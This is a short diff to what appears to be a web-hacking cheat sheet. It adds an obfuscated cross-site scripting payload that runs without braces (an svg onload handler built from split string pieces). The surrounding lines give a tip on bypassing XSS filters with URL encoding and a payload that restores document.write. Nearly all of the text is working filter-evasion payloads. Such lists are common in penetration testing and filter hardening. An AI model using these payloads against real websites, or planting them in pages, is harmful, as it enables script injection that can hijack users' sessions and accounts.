@@ -249,4 +249,4 @@ Other tricks
     To bypass XSS filters: try submitting URL encoded strings, if decoded: bingo.
 
     Restoring javascript functions **javascript:document.write=HTMLDocument.prototype.write;document.write(‘STRUKT’);**
-
+    XSS no barces **<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//**
